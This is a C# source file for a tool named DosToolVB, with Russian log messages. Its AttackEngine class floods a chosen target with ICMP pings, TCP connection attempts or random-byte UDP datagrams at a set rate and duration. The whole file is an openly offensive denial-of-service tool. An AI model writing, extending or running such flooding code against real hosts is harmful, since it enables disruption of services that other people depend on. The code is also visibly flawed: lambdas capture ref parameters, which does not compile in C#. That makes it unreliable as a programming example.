using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace DosToolVB
{
    static class AttackEngine
    {
        public static void StartAttack(string target, string protocol, int port, int packetSize, int packetsPerSecond, int durationSec)
        {
            int delayMs = 0;
            if (packetsPerSecond > 0)
                delayMs = 1000 / packetsPerSecond;

            DateTime startTime = DateTime.Now;
            int packetCount = 0;

            Logger.Log("=== Начало атаки на " + target + " (" + protocol + ") ===");

            Parallel.Invoke(
                () => RunAttack(target, protocol, port, packetSize, ref packetCount, ref startTime, durationSec, delayMs),
                () => ShowStats(ref packetCount, ref startTime, durationSec)
            );

            Logger.Log("=== Атака завершена. Отправлено пакетов: " + packetCount + " ===");
        }

        static void RunAttack(string target, string protocol, int port, int packetSize, ref int packetCount, ref DateTime startTime, int durationSec, int delayMs)
        {
            while (true)
            {
                if (durationSec > 0 && (DateTime.Now - startTime).TotalSeconds >= durationSec)
                    break;

                try
                {
                    switch (protocol)
                    {
                        case "ICMP":
                            PingReply reply = new Ping().Send(target, 1000, new byte[packetSize]);
                            if (reply.Status == IPStatus.Success)
                            {
                                Logger.Log("✅ " + target + " — " + reply.RoundtripTime + " мс", ConsoleColor.Green);
                            }
                            else
                            {
                                Logger.Log("❌ " + target + " — " + reply.Status.ToString(), ConsoleColor.Red);
                            }
                            break;

                        case "TCP":
                            using (TcpClient client = new TcpClient())
                            {
                                IAsyncResult result = client.BeginConnect(target, port, null, null);
                                bool success = result.AsyncWaitHandle.WaitOne(500, false);
                                if (success)
                                {
                                    Logger.Log("✅ TCP " + target + ":" + port + " — открыт", ConsoleColor.Green);
                                }
                                else
                                {
                                    Logger.Log("❌ TCP " + target + ":" + port + " — закрыт или не отвечает", ConsoleColor.Red);
                                }
                                client.Close();
                            }
                            break;

                        case "UDP":
                            using (UdpClient client = new UdpClient())
                            {
                                byte[] data = new byte[packetSize];
                                new Random().NextBytes(data);
                                client.Send(data, data.Length, target, port);
                                Logger.Log("📤 UDP " + target + ":" + port + " — отправлено " + packetSize + " байт", ConsoleColor.Yellow);
                            }
                            break;
                    }

                    packetCount++;
                }
                catch (Exception ex)
                {
                    Logger.Log("⚠️ Ошибка: " + ex.Message, ConsoleColor.Magenta);
                }

                if (delayMs > 0)
                    Thread.Sleep(delayMs);
            }
        }

        static void ShowStats(ref int packetCount, ref DateTime startTime, int durationSec)
        {
            while (true)
            {
                if (durationSec > 0 && (DateTime.Now - startTime).TotalSeconds >= durationSec)
                    break;

                Console.Title = "DosToolVB — пакетов: " + packetCount + " | Время: " + (DateTime.Now - startTime).Seconds + " сек";
                Thread.Sleep(1000);
            }
        }
    }
}